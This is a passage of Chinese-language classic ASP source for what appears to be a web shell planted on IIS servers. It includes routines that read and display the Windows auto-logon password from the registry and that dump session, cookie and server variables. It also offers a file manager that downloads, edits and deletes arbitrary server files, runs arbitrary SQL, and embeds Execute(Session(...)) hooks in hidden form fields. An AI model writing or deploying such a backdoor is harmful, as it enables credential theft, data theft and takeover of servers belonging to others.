		Echo GetTheSize(oTheDrive.FreeSpace)
		Echo "&lt;/td>&lt;td>"
		Echo GetTheSize(oTheDrive.TotalSize)
		Echo "&lt;/td>&lt;/tr>"
		If Err Then Err.Clear
	Next
	
	Echo Replace(sFooter, "=2", "=6")
	
	Set oTheDrive = Nothing
End Sub

Function GetDriveType(n)
	Select Case n
		Case 0
			GetDriveType = "未知"
		Case 1
			GetDriveType = "可移动磁盘"
		Case 2
			GetDriveType = "本地硬盘"
		Case 3
			GetDriveType = "网络磁盘"
		Case 4
			GetDriveType = "CD-ROM"
		Case 5
			GetDriveType = "RAM 磁盘"
	End Select
End Function

Sub GetTerminalInfo()
	If isDebugMode = False Then On Error Resume Next
	Dim terminalPortPath, terminalPortKey, termPort
	Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
	Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

	terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
	terminalPortKey = "PortNumber"
	termPort = oWshl.RegRead(terminalPortPath &amp; terminalPortKey)

	If termPort = "" Or Err.Number &lt;> 0 Then 
		Echo  "&amp;nbsp;无法得到终端服务端口, 请检查权限是否已经受到限制.&lt;br/>"
	 Else
		Echo  "&amp;nbsp;当前终端服务端口: " &amp; termPort &amp; "&lt;br/>"
	End If
	
	autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
	autoLoginEnableKey = "AutoAdminLogon"
	autoLoginUserKey = "DefaultUserName"
	autoLoginPassKey = "DefaultPassword"
	isAutoLoginEnable = oWshl.RegRead(autoLoginPath &amp; autoLoginEnableKey)
	
	If isAutoLoginEnable = 0 Then
		Echo  "&amp;nbsp;系统自动登录功能未开启"
	Else
		autoLoginUsername = oWshl.RegRead(autoLoginPath &amp; autoLoginUserKey)
		Echo  "&amp;nbsp;自动登录的系统帐户: " &amp; autoLoginUsername &amp; "&lt;br />"
		autoLoginPassword = oWshl.RegRead(autoLoginPath &amp; autoLoginPassKey)
		If Err Then
			Err.Clear
			Echo  "False"
		End If
		Echo  "&amp;nbsp;自动登录的帐户密码: " &amp; autoLoginPassword &amp; "&lt;br />"
	End If
End Sub

Sub ObjCheck()
	Dim aObj(19)
	Dim x, objTmp, theObj, strObj
	If isDebugMode = False Then On Error Resume Next

	strObj = Trim(getPost("TheObj"))
	aObj(0) = "MSWC.AdRotator|广告轮换组件"
	aObj(1) = "MSWC.BrowserType|浏览器信息组件"
	aObj(2) = "MSWC.NextLink|内容链接库组件"
	aObj(3) = "MSWC.Tools|"
	aObj(4) = "MSWC.Status|"
	aObj(5) = "MSWC.Counters|计数器组件"
	aObj(6) = "MSWC.PermissionChecker|权限检测组件"
	aObj(7) = "Adodb.Connection|ADO 数据对象组件"
	aObj(8) = "CDONTS.NewMail|虚拟 SMTP 发信组件"
	aObj(9) = "Scripting.FileSystemObject|FSO组件"
	aObj(10) = "Adodb.Stream|Stream 流组件"
	aObj(11) = "Shell.Application|"
	aObj(12) = "WScript.Shell|"
	aObj(13) = "Wscript.Network|"
	aObj(14) = "ADOX.Catalog|"
	aObj(15) = "JMail.SmtpMail|JMail 邮件收发组件"
	aObj(16) = "Persits.Upload.1|ASPUpload 文件上传组件"
	aObj(17) = "LyfUpload.UploadFile|刘云峰的文件上传组件组件"
	aObj(18) = "SoftArtisans.FileUp|SA-FileUp 文件上传组件"
	aObj(19) = strObj &amp; "|您所要检测的组件"

	Echo "&lt;br/>"
	Echo Replace(Replace(sHeader, "{$s}", "服务器组件信息"), "=2", "=3")
	Echo "&lt;tr class=td>"
	Echo "&lt;td>&amp;nbsp;组件&lt;font color=#666666>(描述)&lt;/font>&lt;/td>"
	Echo "&lt;td width=10% align=center>支持&lt;/td>"
	Echo "&lt;td width=15% align=center>版本&lt;/td>"
	Echo "&lt;/tr>"
	For Each x In aObj
		theObj = Split(x, "|")
		If theObj(0) = "" Then Exit For
		Set objTmp = Server.CreateObject(theObj(0))
		If Err &lt;> -2147221005 Then
			x = x &amp; "|√" &amp; IIf(Err = -2147221005, "&lt;font color=#666666>(权限不足)&lt;/font>", "") &amp; "|"
			x = x &amp; objTmp.Version
		Else
			x = x &amp; "|&lt;font color=red>×&lt;/font>|"
		End If
		If Err Then Err.Clear
		Set objTmp = Nothing

		theObj = Split(x, "|")
		theObj(1) = theObj(0) &amp; IIf(theObj(1) &lt;> "", " &lt;font color=#666666>(" &amp; theObj(1) &amp; ")&lt;/font>", "")
		Echo "&lt;tr>"
		Echo "&lt;td>&amp;nbsp;" &amp; theObj(1) &amp; "&lt;/td>"
		Echo "&lt;td align=center>" &amp; theObj(2) &amp; "&lt;/td>"
		Echo "&lt;td align=center>" &amp; theObj(3) &amp; "&lt;/td>"
		Echo "&lt;/tr>"
	Next
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden name=PageName value=PageCheck>&lt;input type=hidden name=theAct id=theAct>"
	Echo "&lt;tr>"
	Echo "&lt;td colspan=3>&amp;nbsp;其它组件检测:"
	Echo "&lt;input name=TheObj type=text id=TheObj style='width:585px;' value=""" &amp; strObj &amp; """>"
	Echo "&lt;input type=submit name=Submit value=提交>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/form>"
	Echo Replace(sFooter, "=2", "=3")
End Sub

Sub PageCSInfo()
	If isDebugMode = False Then On Error Resume Next
	Dim sKey, sVar, sVariable
	
	ShowTitle("客户端服务器交互信息")
	
	Echo Replace(sHeader, "{$s}", "Application 变量查看")
	For Each sVariable In Application.Contents
		Echo "&lt;tr>&lt;td valign=top style='width:130px;'>"
		Echo "&amp;nbsp;&lt;span class=fixSpan style='width:130px;' title='" &amp; sVariable &amp; "'>" &amp; sVariable &amp; "&lt;/span>"
		Echo "&lt;/td>&lt;td style='padding-left:7px;' class=fixTable>&lt;span>"
		If IsArray(Application(sVariable)) = True Then
			For Each sVar In Application(sVariable)
				Echo "&lt;div>" &amp; StrEncode(sVar) &amp; "&lt;/div>"
			Next
		 Else
			Echo StrEncode(Application(sVariable))
		End If
		Echo "&lt;/span>&lt;/td>&lt;/tr>"
	Next
	Echo sFooter

	Echo "&lt;br />" &amp; Replace(sHeader, "{$s}", "Session 变量查看")
	For Each sVariable In Session.Contents
		Echo "&lt;tr>&lt;td valign=top style='width:130px;'>"
		Echo "&amp;nbsp;&lt;span class=fixSpan style='width:130px;' title='" &amp; sVariable &amp; "'>" &amp; sVariable &amp; "&lt;/span>"
		Echo "&lt;/td>&lt;td style='padding-left:7px;' class=fixTable>&lt;span>"
		Echo StrEncode(Session(sVariable))
		Echo "&lt;/span>&lt;/td>&lt;/tr>"
	Next
	Echo sFooter
	
	Echo "&lt;br />" &amp; Replace(sHeader, "{$s}", "Cookies 变量查看")
	For Each sVariable In Request.Cookies
		If Request.Cookies(sVariable).HasKeys Then
			For Each sKey In Request.Cookies(sVariable)
				Echo "&lt;tr>&lt;td valign=top style='width:130px;'>"
				Echo "&amp;nbsp;&lt;span class=fixSpan style='width:130px;' title='" &amp; sVariable &amp; "'>" &amp; sVariable &amp; "(" &amp; sKey &amp; ")&lt;/span>"
				Echo "&lt;/td>&lt;td style='padding-left:7px;' class=fixTable>&lt;span>"
				Echo StrEncode(Request.Cookies(sVariable)(sKey))
				Echo "&lt;/span>&lt;/td>&lt;/tr>"
			Next
		 Else
			Echo "&lt;tr>&lt;td valign=top style='width:130px;'>&amp;nbsp;&lt;span class=fixSpan style='width:130px;' title='" &amp; sVariable &amp; "'>" &amp; sVariable &amp; "&lt;/span>&lt;/td>&lt;td style='padding-left:7px;'>" &amp; StrEncode(Request.Cookies(sVariable)) &amp; "&lt;/td>&lt;/tr>"
		End If
	Next
	Echo sFooter
	
	Echo "&lt;br />" &amp; Replace(sHeader, "{$s}", "ServerVariables 变量查看")
	For Each sVariable In Request.ServerVariables
		Echo "&lt;tr>&lt;td>&amp;nbsp;" &amp; sVariable &amp; ":&lt;/td>&lt;td style='padding-left:7px;' class=fixTable>" &amp; StrEncode(Request.ServerVariables(sVariable)) &amp; "&lt;/li>"
	Next
	Echo sFooter
End Sub

Sub PageFso()
	ShowTitle("FSO文件浏览操作器")
	
	Select Case theAct
		Case "rename"
			RenOne()
		Case "download"
			DownTheFile()
			Response.End()
		Case "del"
			DelOne()
		Case "newone"
			NewOne()
		Case "saveas"
			SaveAs()
		Case "save"
			SaveToFile()
			ShowEdit()
			Response.End()
		Case "showedit"
			ShowEdit()
			Response.End()
		Case "showimage"
			ShowImage()
			Response.End()
		Case "copy", "move"
			MoveCopyOne()
	End Select
	
	If theAct &lt;> "" Then thePath = GetPost("truePath")
	
	FsoFileExplorer()
End Sub

Sub FsoFileExplorer()
	Dim objX, theFolder, folderId, extName, parentFolderName
	Dim strPath
	If isDebugMode = False Then On Error Resume Next
	If thePath = "" Then thePath = rootPath
	strPath = thePath
	
	If oFso.FolderExists(strPath) = False Then
		ShowErr(thePath &amp; " 目录不存在或者不允许访问!")
	End If
	
	Set theFolder = oFso.GetFolder(strPath)
	parentFolderName = oFso.GetParentFolderName(strPath) &amp; "\"
	
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "FSO文件浏览操作器")
	Echo "&lt;td colspan=2>&amp;nbsp;"
	Echo "路径: &lt;input style='width:500px;' name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """>"
	Echo "&lt;input type=hidden name=truePath value=""" &amp; HtmlEncode(thePath) &amp; """>"
	Echo " &lt;input type=button value='提交' onclick=Command('submit');>"
	Echo " &lt;input type=button value=上传 onclick=Command('upload')>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2 class=trHead>&amp;nbsp;&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td valign=top>"
	Echo "&lt;input type=hidden name=theAct>"
	Echo "&lt;input type=hidden name=param>"
	Echo "&lt;input type=hidden value=PageFso name=PageName>"
	Echo "&lt;table width='99%' align=center>"
	Echo "&lt;tr>&lt;td colspan=4 class=trHead>&amp;nbsp;&lt;/td>&lt;/tr>&lt;tr class=td>&lt;td>"

	If parentFolderName &lt;> "\" Then
		folderId = Replace(parentFolderName, "\", "\\")
		Echo "&amp;nbsp;&lt;a href=""javascript:changeThePath(&amp;#34;" &amp; folderId &amp; "&amp;#34;);"">↑回上级目录&lt;/a>"
	End If
	Echo "&lt;/td>&lt;td align=center width=80>大小&lt;/td>"
	Echo "&lt;td align=center width=140>最后修改&lt;/td>&lt;td align=center>操作&lt;/td>&lt;/tr>"

	For Each objX In theFolder.SubFolders
		folderId = Replace(objX.Path, "\", "\\")
		Echo "&lt;tr title=""" &amp; objX.Name &amp; """>&lt;td>&amp;nbsp;&lt;font color=CCCCFF>■&lt;/font>"
		Echo "&lt;span class=fixSpan style='width:180;'>"
		Echo "&lt;a href=""javascript:changeThePath(&amp;#34;" &amp; folderId &amp; "&amp;#34;);"">"&amp; objX.Name &amp; "&lt;/a>&lt;/span>"
		Echo "&lt;/td>"
		Echo "&lt;td align=center>-&lt;/td>"
		Echo "&lt;td align=center>" &amp; objX.DateLastModified &amp; "&lt;/td>&lt;td>"
		Echo "&lt;input type=checkbox name=checkBox value=""" &amp; objX.Name &amp; """>"
		Echo "&lt;input type=button onclick=""Command('rename',&amp;#34;" &amp; objX.Name &amp; "&amp;#34;);"" value='Ren' title=重命名>"
		Echo "&lt;input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&amp;#34;" &amp; Replace(objX.Path, "\", "\\") &amp; "&amp;#34;)"">"
		Echo "&lt;/td>&lt;/tr>"
	Next
	For Each objX In theFolder.Files
		If Left(objX.Path, Len(rootPath)) &lt;> rootPath Then
			folderId = ""
		 Else
			folderId = Replace(Replace(UrlEncode(Mid(objX.Path, Len(rootPath) + 1)), "%2E", "."), "+", "%20")
		End If
		Echo "&lt;tr title=""" &amp; objX.Name &amp; """>&lt;td>&amp;nbsp;&lt;font color=CCCCFF>□&lt;/font>"
		Echo "&lt;span class=fixSpan style='width:180;'>"
		If folderId = "" Then
			Echo objX.Name
		 Else
			Echo "&lt;a href='" &amp; Replace(folderId, "%5C", "/") &amp; "' target=_blank>" &amp; objX.Name &amp; "&lt;/a>"
		End If
		Echo "&lt;/span>&lt;/td>&lt;td align=center>" &amp; GetTheSize(objX.Size) &amp; "&lt;/td>"
		Echo "&lt;td align=center>" &amp; objX.DateLastModified &amp; "&lt;/td>&lt;td>"
		Echo "&lt;input type=checkbox name=checkBox value=""" &amp; objX.Name &amp; """>"
		
		extName = LCase(oFso.GetExtensionName(objX.Path))
		If InStr(editableFileExt, "$" &amp; extName &amp; "$") > 0 Then
			Echo "&lt;input type=button value='Edit' title=编辑 onclick=""Command('showedit',&amp;#34;" &amp; objX.Name &amp; "&amp;#34;);"">"
		End If
		If InStr(imageFileExt, "$" &amp; extName &amp; "$") > 0 Then
			Echo "&lt;input type=button value='View' title=查看图片 onclick=""Command('showimage',&amp;#34;" &amp; objX.Name &amp; "&amp;#34;);"">"
		End If
		If extName = "mdb" Then
			Echo "&lt;input type=button value='Access' title=数据库操作 onclick=Command('access',""" &amp; objX.Name &amp; """)>"
		End If
		Echo "&lt;input type=button value='D' title=下载 onclick=""Command('download',&amp;#34;" &amp; objX.Name &amp; "&amp;#34;)"">"
		Echo "&lt;input type=button value='Ren' title=重命名 onclick=""Command('rename',&amp;#34;" &amp; objX.Name &amp; "&amp;#34;)"">"
		Echo "&lt;input type=button value='S' title=另存为 onclick=""Command('saveas',&amp;#34;" &amp; Replace(objX.Path, "\", "\\") &amp; "&amp;#34;)"">"
		Echo "&lt;/td>&lt;/tr>"
	Next
	Echo "&lt;tr class=td>&lt;td colspan=3>&lt;/td>"
	Echo "&lt;td>&lt;input type=checkbox name=checkAll onclick=checkAllBox(this);>"
	Echo "&lt;input type=button value='Delete' onclick=Command('del')>"
	Echo "&lt;input type=button value='Pack' title=打包选中文件(夹) onclick=Command('pack')>"
	Echo "&lt;/td>&lt;/tr>&lt;/table>"
	Echo "&lt;/td>&lt;td width='20%' valign=top align=center>"
	Echo "&lt;input type=button value=刷新 onclick=this.form.thePath.value=this.form.truePath.value;Command('submit');>&lt;br/>"
	Echo "&lt;input type=button value=新建文件 onclick=Command('newone','file')>&lt;br/>"
	Echo "&lt;input type=button value=新建文件夹 onclick=Command('newone','folder')>&lt;hr style='color:#d8d8f0;'/>"
	Echo "移动选中文件(夹)到&lt;br/>&lt;input value=""" &amp; HtmlEncode(thePath) &amp; """ name=MoveTo>&lt;br/>&lt;input type=button value='移动' onclick=Command('move');>&lt;hr style='color:#d8d8f0;'/>"
	Echo "复制选中文件(夹)到&lt;br/>&lt;input value=""" &amp; HtmlEncode(thePath) &amp; """ name=CopyTo>&lt;br/>&lt;input type=button value='复制' onclick=Command('copy');>&lt;hr style='color:#d8d8f0;'/>"
	Echo "&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
	
	Set theFolder = Nothing
End Sub

Sub RenOne()
	Dim objX, strPath, aryParam, isFile, isFolder
	If isDebugMode = False Then On Error Resume Next
	aryParam = Split(GetPost("param"), ",")
	strPath = GetPost("truePath") &amp; "\"
	aryParam(0) = strPath &amp; aryParam(0)
	isFile = oFso.FileExists(aryParam(0))
	isFolder = oFso.FolderExists(aryParam(0))

	If isFile = False And isFolder = False Then
		ShowErr("文件(夹)不存在或者不允许访问!")
	End If

	If isFile = False Then
		Set objX = oFso.GetFolder(aryParam(0))
		objX.Name = aryParam(1)
	 Else
		Set objX = oFso.GetFile(aryParam(0))
		objX.Name = aryParam(1)
	End If
	Set objX = Nothing

	ChkErr(Err)
End Sub

Sub DownTheFile()
	Response.Clear
	Dim oStream, strPath
	If isDebugMode = False Then On Error Resume Next
	strPath = GetPost("truePath") &amp; "\" &amp; GetPost("param")
	Set oStream = Server.CreateObject("adodb.stream")
	oStream.Open
	oStream.Type = 1
	oStream.LoadFromFile(strPath)
	ChkErr(Err)
	Response.AddHeader "Content-Disposition", "Attachment; Filename=" &amp; GetPost("param")
	Response.AddHeader "Content-Length", oStream.Size
	Response.Charset = "UTF-8"
	Response.ContentType = "Application/Octet-Stream"
	Response.BinaryWrite oStream.Read 
	Response.Flush
	oStream.Close
	Set oStream = Nothing
End Sub

Sub DelOne()
	Dim objX, strPath
	If isDebugMode = False Then On Error Resume Next
	strPath = GetPost("truePath") &amp; "\"
	For Each objX In Request.Form("checkBox")
		If oFso.FolderExists(strPath &amp; objX) = True Then
			Call oFso.DeleteFolder(strPath &amp; objX, True)
			ChkErr(Err)
		Else
			If oFso.FileExists(strPath &amp; objX) = True Then
				Call oFso.DeleteFile(strPath &amp; objX, True)
				ChkErr(Err)
			End If
		End If
	Next
End Sub

Sub MoveCopyOne()
	Dim objX, strPath, strMoveTo, strCopyTo
	If isDebugMode = False Then On Error Resume Next
	strMoveTo = GetPost("MoveTo")
	strCopyTo = GetPost("CopyTo")
	strPath = GetPost("truePath") &amp; "\"
	If theAct = "move" Then
		strMoveTo = strMoveTo &amp; "\"
	 Else
		strCopyTo = strCopyTo &amp; "\"
	End If

	For Each objX In Request.Form("checkBox")
		If theAct = "move" Then
			If InStr(strMoveTo, strPath &amp; objX) > 0 Then
				ShowErr("目标文件夹不能在源文件夹内")
			End If
			If oFso.FileExists(strPath &amp; objX) = True Then
				Call oFso.MoveFile(strPath &amp; objX, strMoveTo &amp; objX)
			 Else
				Call oFso.MoveFolder(strPath &amp; objX, strMoveTo &amp; objX)
			End If
		 Else
			If InStr(strCopyTo, strPath &amp; objX) > 0 Then
				ShowErr("目标文件夹不能在源文件夹内")
			End If
			If oFso.FileExists(strPath &amp; objX) = True Then
				Call oFso.CopyFile(strPath &amp; objX, strCopyTo &amp; objX)
			 Else
				Call oFso.CopyFolder(strPath &amp; objX, strCopyTo &amp; objX)
			End If
		End If
		ChkErr(Err)
	Next
End Sub

Sub NewOne()
	Dim objX, strPath, aryParam
	If isDebugMode = False Then On Error Resume Next
	aryParam = Split(GetPost("param"), ",")
	strPath = GetPost("truePath") &amp; "\" &amp; aryParam(0)

	If aryParam(1) = "file" Then
		Call oFso.CreateTextFile(strPath, False)
	 Else
		oFso.CreateFolder(strPath)
	End If
End Sub

Sub ShowEdit()
	Dim theFile, strPath
	If isDebugMode = False Then On Error Resume Next
	strPath = GetPost("truePath") &amp; "\" &amp; GetPost("param")
	If Right(strPath, 1) = "\" Then strPath = Left(strPath, Len(strPath) - 1)
	Set theFile = oFso.OpenTextFile(strPath, 1, False)
	ChkErr(Err)

	Echo "&lt;form method=post action=" &amp; url &amp; ">" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(Replace(sHeader, "{$s}", "FSO文本编辑器"), "=2", "=1")
	Echo "&lt;input type=hidden name=theAct>"
	Echo "&lt;input type=hidden value=PageFso name=PageName>"
	Echo "&lt;tr>"
	Echo "&lt;td height=22>&amp;nbsp;&lt;input name=truePath value=""" &amp; strPath &amp; """ style=width:500px;>"
	Echo "&lt;input type=submit value=查看 onClick=this.form.theAct.value='showedit';>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;&lt;textarea name=fileContent style='width:735px;height:500px;'>"
	Echo HtmlEncode(theFile.ReadAll())
	Echo "&lt;/textarea>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=td align=center>&lt;input type=button name=Submit value=保存 onClick=""if(confirm('确认保存修改?')){this.form.theAct.value='save';this.form.submit();}"">"
	Echo "&lt;input type=reset value=重置>&lt;input type=button onclick='window.close();' value=关闭>"
	Echo "&lt;input type=button value=预览 onclick=preView('1'); title='以HTML方式在新窗口中预览当前代码'>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/form>"
	Echo "&lt;/table>"

	Set theFile = Nothing
End Sub

Sub SaveToFile()
	Dim theFile, strPath, fileContent
	If isDebugMode = False Then On Error Resume Next
	fileContent = GetPost("fileContent")
	strPath = GetPost("truePath")

	Set theFile = oFso.OpenTextFile(strPath, 2, True)
	theFile.Write fileContent
	theFile.Close
	ChkErr(Err)
	
	Set theFile = Nothing
End Sub

Sub SaveAs()
	Dim strPath, aryParam, isFile
	If isDebugMode = False Then On Error Resume Next
	aryParam = Split(GetPost("param"), ",")
	aryParam(0) = aryParam(0)
	aryParam(1) = aryParam(1)
	isFile = oFso.FileExists(aryParam(0))
	
	If isFile = True Then
		oFso.CopyFile aryParam(0), aryParam(1), False
	 Else
		oFso.CopyFolder aryParam(0), aryParam(1), False
	End If
	
	ChkErr(Err)
End Sub

Sub ShowImage()
	Dim stream, strPath, fileContentType
	If isDebugMode = False Then On Error Resume Next
	strPath = GetPost("truePath") &amp; "\" &amp; GetPost("param")

	Set stream = Server.CreateObject("adodb.stream")
	stream.Open
	stream.Type = 1
	stream.LoadFromFile(strPath)
	ChkErr(Err)
	Response.Clear
	Response.BinaryWrite stream.Read 
	stream.Close

	Set stream = Nothing
End Sub

Sub PageDBTool()
	ShowTitle("Access + SQL Server 数据库操作")
	Echo "&lt;form method=post action=""" &amp; url &amp; """>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"

	If theAct &lt;> "" And theAct &lt;> "Query" And theAct &lt;> "ShowTables" Then
		SqlShowEdit()
		Echo "&lt;/form>"
		Response.End()
	End If

	ShowDBTool()
	
	Select Case theAct
		Case "Query"
			ShowQuery()
		Case "ShowTables"
			ShowTables()
	End Select
	
	Echo "&lt;/form>"
End Sub

Sub ShowDBTool()
	Echo "&lt;input type=hidden value=PageDBTool name=PageName>"
	Echo "&lt;input type=hidden name=theAct>"
	Echo "&lt;input type=hidden name=param>"

	Echo Replace(sHeader, "{$s}", "Access + SQL Server 数据库操作")
	Echo "&lt;tr>"
	Echo "&lt;td height=50 align=center colspan=2>"
	Echo "&lt;select onchange=""this.form.thePath.value=this.value;this.value='';"">&lt;option value=''>模板选择"
	Echo "&lt;option value='DataSource;UserName;PassWord;'>MDB(1)"
	Echo "&lt;option value='sql:Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &amp; rootPath &amp; "\db.mdb'>MDB(2)"
	Echo "&lt;option value='sql:Provider=SQLOLEDB.1;Server=(local);User ID=UserName;Password=***;Database=Pubs;'>SQL Server"
	Echo "&lt;option value='sql:Driver={MySql};Server=127.0.0.1;Port=3306;Database=DbName;UId=root;Pwd=***;'>MySQL Server"
	Echo "&lt;option value='sql:Dsn=DsnName;'>数据源"
	Echo "&lt;/select> "
	Echo "&lt;input name=thePath type=text id=thePath value=""" &amp; HtmlEncode(thePath) &amp; """ size=60>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td align=center class=td>"
	Echo "&lt;input type=submit name=Submit value='提 交' onclick=""this.form.theAct.value='ShowTables';"">"
	Echo "&lt;input type=reset value='重 置'> "
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/table>"
End Sub

Sub ShowTables()
	Dim Cat, objTable, objColumn, intColSpan, objSchema
	If isDebugMode = False Then On Error Resume Next

	Echo sSqlSelect &amp; "&lt;textarea name=sql rows=1 style='width:647px;'>&lt;/textarea>"
	Echo " &lt;input type=button value=执行查询 onclick=""this.form.theAct.value='ShowQuery';Command('Query','0');"">"
	Echo "&lt;input type=button value=- onclick='if(this.form.sql.rows>3)this.form.sql.rows-=3;'>"
	Echo "&lt;input type=button value=+ onclick='this.form.sql.rows+=3;'>"
	Echo "&lt;br/>"

	Echo Replace(sHeader, "{$s}", "数据表及结构查看")
	
	CreateConn()
	Set Cat = Server.CreateObject("ADOX.Catalog")
	Cat.ActiveConnection = conn.ConnectionString
	Echo "&lt;tr>&lt;td width='20%' valign=top>"
	For Each objTable In Cat.Tables
		Echo "&lt;span class=fixSpan title='" &amp; objTable.Name &amp; "' onclick=""Command('Query',this.title);this.disabled=true;"" "
		Echo "style='width:94%;padding-left:8px;cursor:hand;'>" &amp; objTable.Name &amp; "&lt;/span>"
	Next
	Echo "&lt;/td>&lt;td>"
	intColSpan = IIf(isSqlServer = True, "4", "6")
	
	For Each objTable In Cat.Tables
		Echo "&lt;table width=98% align=center>"
		Echo "&lt;tr>"
		Echo "&lt;td class=trHead colspan=" &amp; intColSpan &amp; ">&amp;nbsp;&lt;/td>"
		Echo "&lt;/tr>"
		Echo "&lt;tr>"
		Echo "&lt;td colspan=" &amp; intColSpan &amp; " class=td>&amp;nbsp;&lt;strong>"
		Echo objTable.Name &amp; "&lt;/strong>&lt;/td>"
		Echo "&lt;/tr>"
		
		Echo "&lt;tr align=center>"
		Echo "&lt;td align=left width=*>&amp;nbsp;列名&lt;/td>"
		Echo "&lt;td width=80>类型&lt;/td>"
		Echo "&lt;td width=60>大小&lt;/td>"
		Echo "&lt;td width=60>可否为空&lt;/td>"
		If isSqlServer = False Then
			Echo "&lt;td width=50>默认值&lt;/td>"
			Echo "&lt;td width=100>描述&lt;/td>"
		End If
		Echo "&lt;/tr>"
		
		For Each objColumn In Cat.Tables(objTable.Name).Columns
			Echo "&lt;tr align=center>"
			Echo "&lt;td align=left>&lt;span style='width:98%;padding-left:5px;'>" &amp; objColumn.Name &amp; "&lt;/a>&lt;/td>"
			Echo "&lt;td>" &amp; GetDataType(objColumn.Type) &amp; "&lt;/td>"
			If objColumn.DefinedSize &lt;> 0 Then
				Echo "&lt;td>" &amp; objColumn.DefinedSize &amp; "&lt;/td>"
			 Else
				Echo "&lt;td>" &amp; IIf(objColumn.Precision &lt;> 0, objColumn.Precision, "&amp;nbsp;") &amp; "&lt;/td>"
			End If
			Echo "&lt;td>" &amp; IIf(objColumn.Attributes = 1, "False", "True") &amp; "&lt;/td>"
			If isSqlServer = False Then
				Echo "&lt;td>&lt;span class=fixSpan style='width:40px;padding-left:5px;' title=""" &amp; HtmlEncode(objColumn.Properties("Default").value) &amp; """>"
				Echo HtmlEncode(objColumn.Properties("Default").value) &amp; "&lt;/span>&lt;/td>"
				Echo "&lt;td align=left>&lt;span class=fixSpan style='width:95px;padding-left:5px;' title=""" &amp; objColumn.Properties("Description") &amp; """>"
				Echo objColumn.Properties("Description") &amp; "&lt;/span>&lt;/td>"
			End If
			Echo "&lt;/tr>"
		Next

		Echo "&lt;tr>"
		Echo "&lt;td colspan=" &amp; intColSpan &amp; " class=td>&amp;nbsp;&lt;/td>"
		Echo "&lt;/tr>"
		Echo "&lt;/table>&lt;br/>"
	Next

	Echo "&lt;/td>"
	Echo "&lt;/tr>"

	Echo "&lt;tr>"
	Echo "&lt;td colspan=2 class=trHead>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td colspan=2 class=td align=right>By Marcos 2005.11&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/table>"
	
	Set Cat = Nothing
	DestoryConn()
End Sub

Sub ShowQuery()
	Dim i, j, x, rs, sql, sqlB, sqlC, Cat, intPage, objTable, strParam, strTable, strPrimaryKey, sExec
	If isDebugMode = False Then On Error Resume Next
	sql = GetPost("sql")
	strParam = GetPost("param")
	strTable = GetPost("theTable")
	Set rs = Server.CreateObject("Adodb.RecordSet")

	If IsNumeric(strParam) = True Then
		intPage = strParam
	 Else
		intPage = 1
		strTable = strParam
		sql = ""
	End If
	If sql = "" Then
		sql = "Select * From [" &amp; strTable &amp; "]"
	End If

	For i = 1 To Request.Form("KeyWord").Count
		If Request.Form("KeyWord")(i) &lt;> "" Then
			sqlC = Replace(Request.Form("KeyWord")(i), "'", "''")
			sqlC = IIf(Request.Form("JoinTag")(i) = " like ", "'" &amp; sqlC &amp; "'", sqlC)
			sqlB = sqlB &amp; "[" &amp; Request.Form("Fields")(i) &amp; "]" &amp; Request.Form("JoinTag")(i) &amp; sqlC &amp; Request.Form("JoinTag2")(i)
		End If
	Next
	If sqlB &lt;> "" Then
		sql = "Select * From [" &amp; strTable &amp; "] Where " &amp; sqlB
		If Right(sql, 4) = " Or " Then sql = Left(sql, Len(sql) - 4)
		If Right(sql, 5) = " And " Then sql = Left(sql, Len(sql) - 5)
	End If

	Echo sSqlSelect &amp; "&lt;input type=hidden name=sql value=""" &amp; HtmlEncode(sql) &amp; """>"
	Echo "&lt;textarea name=sqlB rows=1 style='width:647px;'>" &amp; HtmlEncode(sql) &amp; "&lt;/textarea>"
	Echo " &lt;input type=button value=执行查询 onclick=""this.form.sql.value=this.form.sqlB.value;Command('Query','0');"">"
	Echo "&lt;input type=button value=- onclick='if(this.form.sqlB.rows>3)this.form.sqlB.rows-=3;'>"
	Echo "&lt;input type=button value=+ onclick='this.form.sqlB.rows+=3;'>"
	Echo "&lt;input type=hidden name=theTable value=""" &amp; HtmlEncode(strTable) &amp; """>"
	Echo "&lt;br/>"
	
	Echo Replace(sHeader, "{$s}", "SQL查询器")

	CreateConn()
	Set Cat = Server.CreateObject("ADOX.Catalog")
	Cat.ActiveConnection = conn.ConnectionString
	Echo "&lt;tr>&lt;td width='20%' valign=top>"
